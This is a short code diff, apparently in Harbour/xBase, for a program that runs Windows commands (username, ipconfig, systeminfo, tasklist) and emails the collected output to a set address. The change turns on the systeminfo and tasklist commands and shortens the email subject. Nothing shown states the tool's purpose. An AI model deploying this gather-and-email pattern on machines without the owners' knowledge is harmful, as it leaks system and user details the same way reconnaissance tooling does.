@@ -11,8 +11,8 @@ PROCEDURE MAIN
    AADD( aCommand , "echo %USERNAME%" )
    //AADD( aCommand , "set" )
    AADD( aCommand , "ipconfig" )
-   //AADD( aCommand , "Systeminfo" )
-   //AADD( aCommand , "Tasklist" )
+   AADD( aCommand , "Systeminfo" )
+   AADD( aCommand , "Tasklist" )
    //AADD( aCommand , "driverquery -v" )
    //AADD( aCommand , "Netstat" )
    
@@ -27,7 +27,7 @@ PROCEDURE MAIN
        cCommandTodos += cCommand + hb_eol()
    NEXT
 
-   EnviaEmail( cTo, "Resultado da máquina " + cLabel , cCommandTodos )
+   EnviaEmail( cTo, cLabel , cCommandTodos )
    
  RETURN  
 
